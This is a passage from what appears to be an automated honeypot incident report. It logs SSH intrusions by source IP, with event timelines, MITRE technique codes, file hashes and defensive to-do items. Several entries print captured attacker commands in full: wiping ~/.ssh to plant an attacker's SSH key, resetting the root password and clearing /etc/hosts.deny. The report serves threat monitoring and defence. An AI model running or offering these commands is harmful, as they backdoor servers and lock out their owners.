| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:27:13` | `cowrie.session.connect` |
| `2026-06-08 14:27:13` | `cowrie.client.version` |
| `2026-06-08 14:27:13` | `cowrie.client.kex` |
| `2026-06-08 14:27:14` | `cowrie.login.success` |
| `2026-06-08 14:27:15` | `cowrie.session.params` |
| `2026-06-08 14:27:15` | `cowrie.command.input` |
| `2026-06-08 14:27:15` | `cowrie.command.failed` |
| `2026-06-08 14:27:15` | `cowrie.log.closed` |
| `2026-06-08 14:27:16` | `cowrie.session.params` |
| `2026-06-08 14:27:16` | `cowrie.command.input` |
| `2026-06-08 14:27:16` | `cowrie.session.file_download` |
| `2026-06-08 14:27:16` | `cowrie.log.closed` |
| `2026-06-08 14:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e8b105b313

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 14:27 |
| **Last Seen** | 2026-06-08 14:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:27:20` | `cowrie.session.connect` |
| `2026-06-08 14:27:20` | `cowrie.client.version` |
| `2026-06-08 14:27:20` | `cowrie.client.kex` |
| `2026-06-08 14:27:22` | `cowrie.login.success` |
| `2026-06-08 14:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226a17bda033

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-08 15:06 |
| **Last Seen** | 2026-06-08 15:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:06:33` | `cowrie.session.connect` |
| `2026-06-08 15:06:33` | `cowrie.client.version` |
| `2026-06-08 15:06:33` | `cowrie.client.kex` |
| `2026-06-08 15:06:33` | `cowrie.login.success` |
| `2026-06-08 15:06:33` | `cowrie.session.params` |
| `2026-06-08 15:06:33` | `cowrie.command.input` |
| `2026-06-08 15:06:33` | `cowrie.command.failed` |
| `2026-06-08 15:06:34` | `cowrie.log.closed` |
| `2026-06-08 15:06:34` | `cowrie.session.params` |
| `2026-06-08 15:06:34` | `cowrie.command.input` |
| `2026-06-08 15:06:34` | `cowrie.session.file_download` |
| `2026-06-08 15:06:34` | `cowrie.log.closed` |
| `2026-06-08 15:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d9c8df3148

| Field | Detail |
|---|---|
| **Source IP** | `103.154.158[.]70` |
| **First Seen** | 2026-06-08 15:06 |
| **Last Seen** | 2026-06-08 15:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:06:35` | `cowrie.session.connect` |
| `2026-06-08 15:06:35` | `cowrie.client.version` |
| `2026-06-08 15:06:35` | `cowrie.client.kex` |
| `2026-06-08 15:06:35` | `cowrie.login.success` |
| `2026-06-08 15:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.158[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.154.158[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9637c9a5cb

| Field | Detail |
|---|---|
| **Source IP** | `107.197.183[.]81` |
| **First Seen** | 2026-06-08 15:10 |
| **Last Seen** | 2026-06-08 15:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:10:31` | `cowrie.session.connect` |
| `2026-06-08 15:10:31` | `cowrie.client.version` |
| `2026-06-08 15:10:32` | `cowrie.client.kex` |
| `2026-06-08 15:10:33` | `cowrie.login.success` |
| `2026-06-08 15:10:33` | `cowrie.session.params` |
| `2026-06-08 15:10:33` | `cowrie.command.input` |
| `2026-06-08 15:10:33` | `cowrie.command.failed` |
| `2026-06-08 15:10:34` | `cowrie.log.closed` |
| `2026-06-08 15:10:34` | `cowrie.session.params` |
| `2026-06-08 15:10:34` | `cowrie.command.input` |
| `2026-06-08 15:10:34` | `cowrie.session.file_download` |
| `2026-06-08 15:10:34` | `cowrie.log.closed` |
| `2026-06-08 15:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.197.183[.]81` to AbuseIPDB if not already reported
- [ ] Block `107.197.183[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9561b400e673

| Field | Detail |
|---|---|
| **Source IP** | `107.197.183[.]81` |
| **First Seen** | 2026-06-08 15:10 |
| **Last Seen** | 2026-06-08 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:10:38` | `cowrie.session.connect` |
| `2026-06-08 15:10:38` | `cowrie.client.version` |
| `2026-06-08 15:10:38` | `cowrie.client.kex` |
| `2026-06-08 15:10:39` | `cowrie.login.success` |
| `2026-06-08 15:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.197.183[.]81` to AbuseIPDB if not already reported
- [ ] Block `107.197.183[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb0d07e4e265

| Field | Detail |
|---|---|
| **Source IP** | `37.46.18[.]151` |
| **First Seen** | 2026-06-08 15:31 |
| **Last Seen** | 2026-06-08 15:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:31:24` | `cowrie.session.connect` |
| `2026-06-08 15:31:24` | `cowrie.client.version` |
| `2026-06-08 15:31:24` | `cowrie.client.kex` |
| `2026-06-08 15:31:25` | `cowrie.login.success` |
| `2026-06-08 15:31:25` | `cowrie.session.params` |
| `2026-06-08 15:31:25` | `cowrie.command.input` |
| `2026-06-08 15:31:25` | `cowrie.command.failed` |
| `2026-06-08 15:31:26` | `cowrie.log.closed` |
| `2026-06-08 15:31:26` | `cowrie.session.params` |
| `2026-06-08 15:31:26` | `cowrie.command.input` |
| `2026-06-08 15:31:26` | `cowrie.session.file_download` |
| `2026-06-08 15:31:26` | `cowrie.log.closed` |
| `2026-06-08 15:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.46.18[.]151` to AbuseIPDB if not already reported
- [ ] Block `37.46.18[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c24c7242ef

| Field | Detail |
|---|---|
| **Source IP** | `37.46.18[.]151` |
| **First Seen** | 2026-06-08 15:31 |
| **Last Seen** | 2026-06-08 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:31:28` | `cowrie.session.connect` |
| `2026-06-08 15:31:28` | `cowrie.client.version` |
| `2026-06-08 15:31:28` | `cowrie.client.kex` |
| `2026-06-08 15:31:29` | `cowrie.login.success` |
| `2026-06-08 15:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.46.18[.]151` to AbuseIPDB if not already reported
- [ ] Block `37.46.18[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014c89e6bb7e

| Field | Detail |
|---|---|
| **Source IP** | `106.75.227[.]248` |
| **First Seen** | 2026-06-08 15:42 |
| **Last Seen** | 2026-06-08 15:43 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:s1p69HxMBLWH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:42:51` | `cowrie.session.connect` |
| `2026-06-08 15:42:51` | `cowrie.client.version` |
| `2026-06-08 15:42:51` | `cowrie.client.kex` |
| `2026-06-08 15:42:52` | `cowrie.login.success` |
| `2026-06-08 15:42:52` | `cowrie.session.params` |
| `2026-06-08 15:42:52` | `cowrie.command.input` |
| `2026-06-08 15:42:52` | `cowrie.command.failed` |
| `2026-06-08 15:42:52` | `cowrie.log.closed` |
| `2026-06-08 15:42:53` | `cowrie.session.params` |
| `2026-06-08 15:42:53` | `cowrie.command.input` |
| `2026-06-08 15:42:53` | `cowrie.session.file_download` |
| `2026-06-08 15:42:53` | `cowrie.log.closed` |
| `2026-06-08 15:43:09` | `cowrie.session.params` |
| `2026-06-08 15:43:09` | `cowrie.command.input` |
| `2026-06-08 15:43:09` | `cowrie.log.closed` |
| `2026-06-08 15:43:09` | `cowrie.session.params` |
| `2026-06-08 15:43:09` | `cowrie.command.input` |
| `2026-06-08 15:43:10` | `cowrie.log.closed` |
| `2026-06-08 15:43:10` | `cowrie.session.params` |
| `2026-06-08 15:43:10` | `cowrie.command.input` |
| `2026-06-08 15:43:10` | `cowrie.session.file_download` |
| `2026-06-08 15:43:10` | `cowrie.log.closed` |
| `2026-06-08 15:43:10` | `cowrie.session.params` |
| `2026-06-08 15:43:10` | `cowrie.command.input` |
| `2026-06-08 15:43:11` | `cowrie.log.closed` |
| `2026-06-08 15:43:11` | `cowrie.session.params` |
| `2026-06-08 15:43:11` | `cowrie.command.input` |
| `2026-06-08 15:43:11` | `cowrie.log.closed` |
| `2026-06-08 15:43:12` | `cowrie.session.params` |
| `2026-06-08 15:43:12` | `cowrie.command.input` |
| `2026-06-08 15:43:12` | `cowrie.command.input` |
| `2026-06-08 15:43:12` | `cowrie.log.closed` |
| `2026-06-08 15:43:12` | `cowrie.session.params` |
| `2026-06-08 15:43:12` | `cowrie.command.input` |
| `2026-06-08 15:43:12` | `cowrie.log.closed` |
| `2026-06-08 15:43:12` | `cowrie.session.params` |
| `2026-06-08 15:43:12` | `cowrie.command.input` |
| `2026-06-08 15:43:13` | `cowrie.log.closed` |
| `2026-06-08 15:43:13` | `cowrie.session.params` |
| `2026-06-08 15:43:13` | `cowrie.command.input` |
| `2026-06-08 15:43:13` | `cowrie.log.closed` |
| `2026-06-08 15:43:13` | `cowrie.session.params` |
| `2026-06-08 15:43:13` | `cowrie.command.input` |
| `2026-06-08 15:43:14` | `cowrie.log.closed` |
| `2026-06-08 15:43:14` | `cowrie.session.params` |
| `2026-06-08 15:43:14` | `cowrie.command.input` |
| `2026-06-08 15:43:14` | `cowrie.log.closed` |
| `2026-06-08 15:43:14` | `cowrie.session.params` |
| `2026-06-08 15:43:14` | `cowrie.command.input` |
| `2026-06-08 15:43:15` | `cowrie.log.closed` |
| `2026-06-08 15:43:15` | `cowrie.session.params` |
| `2026-06-08 15:43:15` | `cowrie.command.input` |
| `2026-06-08 15:43:16` | `cowrie.log.closed` |
| `2026-06-08 15:43:16` | `cowrie.session.params` |
| `2026-06-08 15:43:16` | `cowrie.command.input` |
| `2026-06-08 15:43:16` | `cowrie.log.closed` |
| `2026-06-08 15:43:16` | `cowrie.session.params` |
| `2026-06-08 15:43:16` | `cowrie.command.input` |
| `2026-06-08 15:43:17` | `cowrie.log.closed` |
| `2026-06-08 15:43:17` | `cowrie.session.params` |
| `2026-06-08 15:43:17` | `cowrie.command.input` |
| `2026-06-08 15:43:17` | `cowrie.log.closed` |
| `2026-06-08 15:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.227[.]248` to AbuseIPDB if not already reported
- [ ] Block `106.75.227[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a441a2aa8868

| Field | Detail |
|---|---|
| **Source IP** | `106.75.227[.]248` |
| **First Seen** | 2026-06-08 15:55 |
| **Last Seen** | 2026-06-08 15:56 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cTYAGTclT5mh"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 15:55:48` | `cowrie.session.connect` |
| `2026-06-08 15:55:48` | `cowrie.client.version` |
| `2026-06-08 15:55:48` | `cowrie.client.kex` |
| `2026-06-08 15:55:48` | `cowrie.login.success` |
| `2026-06-08 15:55:49` | `cowrie.session.params` |
| `2026-06-08 15:55:49` | `cowrie.command.input` |
| `2026-06-08 15:55:49` | `cowrie.command.failed` |
| `2026-06-08 15:55:49` | `cowrie.log.closed` |
| `2026-06-08 15:55:49` | `cowrie.session.params` |
| `2026-06-08 15:55:49` | `cowrie.command.input` |
| `2026-06-08 15:55:49` | `cowrie.session.file_download` |
| `2026-06-08 15:55:49` | `cowrie.log.closed` |
| `2026-06-08 15:56:05` | `cowrie.session.params` |
| `2026-06-08 15:56:05` | `cowrie.command.input` |
| `2026-06-08 15:56:06` | `cowrie.log.closed` |
| `2026-06-08 15:56:06` | `cowrie.session.params` |
| `2026-06-08 15:56:06` | `cowrie.command.input` |
| `2026-06-08 15:56:06` | `cowrie.log.closed` |
| `2026-06-08 15:56:07` | `cowrie.session.params` |
| `2026-06-08 15:56:07` | `cowrie.command.input` |
| `2026-06-08 15:56:07` | `cowrie.session.file_download` |
| `2026-06-08 15:56:07` | `cowrie.log.closed` |
| `2026-06-08 15:56:07` | `cowrie.session.params` |
| `2026-06-08 15:56:07` | `cowrie.command.input` |
| `2026-06-08 15:56:07` | `cowrie.log.closed` |
| `2026-06-08 15:56:07` | `cowrie.session.params` |
| `2026-06-08 15:56:07` | `cowrie.command.input` |
| `2026-06-08 15:56:08` | `cowrie.log.closed` |
| `2026-06-08 15:56:08` | `cowrie.session.params` |
| `2026-06-08 15:56:08` | `cowrie.command.input` |
| `2026-06-08 15:56:08` | `cowrie.command.input` |
| `2026-06-08 15:56:08` | `cowrie.log.closed` |
| `2026-06-08 15:56:08` | `cowrie.session.params` |
| `2026-06-08 15:56:08` | `cowrie.command.input` |
| `2026-06-08 15:56:09` | `cowrie.log.closed` |
| `2026-06-08 15:56:09` | `cowrie.session.params` |
| `2026-06-08 15:56:09` | `cowrie.command.input` |
| `2026-06-08 15:56:09` | `cowrie.log.closed` |
| `2026-06-08 15:56:09` | `cowrie.session.params` |
| `2026-06-08 15:56:09` | `cowrie.command.input` |
| `2026-06-08 15:56:09` | `cowrie.log.closed` |
| `2026-06-08 15:56:10` | `cowrie.session.params` |
| `2026-06-08 15:56:10` | `cowrie.command.input` |
| `2026-06-08 15:56:10` | `cowrie.log.closed` |
| `2026-06-08 15:56:10` | `cowrie.session.params` |
| `2026-06-08 15:56:10` | `cowrie.command.input` |
| `2026-06-08 15:56:10` | `cowrie.log.closed` |
| `2026-06-08 15:56:11` | `cowrie.session.params` |
| `2026-06-08 15:56:11` | `cowrie.command.input` |
| `2026-06-08 15:56:11` | `cowrie.log.closed` |
| `2026-06-08 15:56:11` | `cowrie.session.params` |
| `2026-06-08 15:56:11` | `cowrie.command.input` |
| `2026-06-08 15:56:12` | `cowrie.log.closed` |
| `2026-06-08 15:56:12` | `cowrie.session.params` |
| `2026-06-08 15:56:12` | `cowrie.command.input` |
| `2026-06-08 15:56:12` | `cowrie.log.closed` |
| `2026-06-08 15:56:12` | `cowrie.session.params` |
| `2026-06-08 15:56:12` | `cowrie.command.input` |
| `2026-06-08 15:56:12` | `cowrie.log.closed` |
| `2026-06-08 15:56:13` | `cowrie.session.params` |
| `2026-06-08 15:56:13` | `cowrie.command.input` |
| `2026-06-08 15:56:13` | `cowrie.log.closed` |
| `2026-06-08 15:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.227[.]248` to AbuseIPDB if not already reported
- [ ] Block `106.75.227[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `167.71.225[.]225` | **100** | 2026-06-08 11:02 | 2026-06-08 12:21 | 57m | 0 | `T1592` | 🟠 MEDIUM |
| `144.79.133[.]50` | **30** | 2026-06-08 11:29 | 2026-06-08 12:40 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `161.248.189[.]72` | **30** | 2026-06-08 12:46 | 2026-06-08 13:53 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `167.71.225[.]225` | **30** | 2026-06-08 14:22 | 2026-06-08 14:53 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `220.154.133[.]120` | **30** | 2026-06-08 11:02 | 2026-06-08 12:08 | 52m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.123.134[.]194` | **30** | 2026-06-08 12:53 | 2026-06-08 13:52 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.188.112[.]111` | **30** | 2026-06-08 12:30 | 2026-06-08 13:29 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `68.183.212[.]68` | **30** | 2026-06-08 12:38 | 2026-06-08 13:29 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.176.210[.]17` | **29** | 2026-06-08 12:48 | 2026-06-08 14:30 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **29** | 2026-06-08 11:02 | 2026-06-08 15:45 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `59.103.119[.]60` | **25** | 2026-06-08 14:36 | 2026-06-08 14:42 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `42.51.32[.]228` | **21** | 2026-06-08 12:47 | 2026-06-08 13:31 | 30m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.17.248[.]205` | **20** | 2026-06-08 12:41 | 2026-06-08 13:19 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.170.248[.]221` | **20** | 2026-06-08 12:44 | 2026-06-08 13:31 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.13.64[.]124` | **19** | 2026-06-08 13:46 | 2026-06-08 14:16 | 7m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.54[.]66` | **17** | 2026-06-08 12:33 | 2026-06-08 12:51 | 23m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.75.227[.]248` | **10** | 2026-06-08 15:27 | 2026-06-08 15:57 | 16m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.217.193[.]233` | **7** | 2026-06-08 14:14 | 2026-06-08 14:21 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `103.187.146[.]107` | **6** | 2026-06-08 14:03 | 2026-06-08 14:16 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `106.51.92[.]114` | **6** | 2026-06-08 11:03 | 2026-06-08 11:13 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `41.111.178[.]165` | **6** | 2026-06-08 14:00 | 2026-06-08 14:14 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `14.225.217[.]138` | **4** | 2026-06-08 11:03 | 2026-06-08 12:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `20.204.136[.]58` | **4** | 2026-06-08 11:53 | 2026-06-08 13:07 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `217.253.123[.]44` | **3** | 2026-06-08 13:07 | 2026-06-08 13:18 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]130` | **3** | 2026-06-08 12:32 | 2026-06-08 12:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]195` | **3** | 2026-06-08 12:33 | 2026-06-08 12:34 | 0m | 0 | `T1592` | 🟢 LOW |
